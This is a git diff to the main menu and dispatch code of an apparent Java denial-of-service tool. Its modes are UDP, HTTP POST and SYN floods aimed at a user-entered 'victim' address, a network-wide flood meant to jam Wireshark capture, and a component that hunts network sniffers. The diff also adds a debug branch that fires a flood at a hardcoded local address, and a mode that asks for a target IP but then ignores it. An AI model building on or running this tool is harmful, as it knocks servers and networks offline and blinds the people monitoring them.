@@ -27,10 +27,14 @@ public class Main extends LoggingUtils {
                     1 | UDP Flood | Spam UDP packets towards victim, might get blocked by some switch storm control.
                     2 | HTTP Post | Spams POST http requests to a web server, supporting different severity modes.
                     3 | SYN Attack | Automatically find an open port on the victim and flood it.
-                    4 | Sniffer Fucker | Find and kill network sniffers.
-                    97 | Broadcast Storm | Flood the entire network with different methods.
-                    98 | Wireshark Flood | Flood every time of protocol to jam Wireshark's sniffing.
-                    99 | HTTP Get | In dev..."""));
+                    4 | Sniffer Fucker | Scan the whole network in a loop to find sniffers.
+                    5 | Wireshark Flood | Flood every time of protocol to jam Wireshark's sniffing.
+                    [WIP] 97 | Broadcast Storm | Flood the entire network with different methods.
+                    [WIP] 99 | HTTP Get | In dev..."""));
+
+            if (attackMode == 0) {
+                new WiresharkFlood("192.168.1.49", 0);
+            }
 
             // UDP Flood
             if (attackMode == 1) {
@@ -45,6 +49,8 @@ public class Main extends LoggingUtils {
             } else if (attackMode == 2) {
 
                 info("HTTP Post attack selected.");
+
+                log("starting http post...");
 
                 final String ipAddress = getUserInput("Enter victim's IPv4 address (do not put http://): ");
 
@@ -81,7 +87,23 @@ public class Main extends LoggingUtils {
             // Sniffer  Fucker
             } else if (attackMode == 4) {
 
+                info("Sniffer Fucker selected.");
+
+                log("starting sniffer fucker...");
+
                 new SnifferFucker();
+
+            } else if (attackMode == 5) {
+
+                info("WireShark Flood selected.");
+
+                log("starting wireshark flood...");
+
+                String specificIP = getUserInput("Do you want to use a specific IP or flood globally (enter IPv4 or press enter to use global):");
+
+                if (specificIP.isEmpty()) specificIP = null;
+
+                new WiresharkFlood(null, -1);
 
             // HTTP Get overload
             } else if (attackMode == 99) {
@@ -107,6 +129,10 @@ public class Main extends LoggingUtils {
                     }
                 }
             } else if (attackMode == 3) {
+
+                info("SYN attack selected.");
+
+                log("starting syn attack...");
 
                 final String address = getUserInput("Enter victim's IPv4 address: ");
 
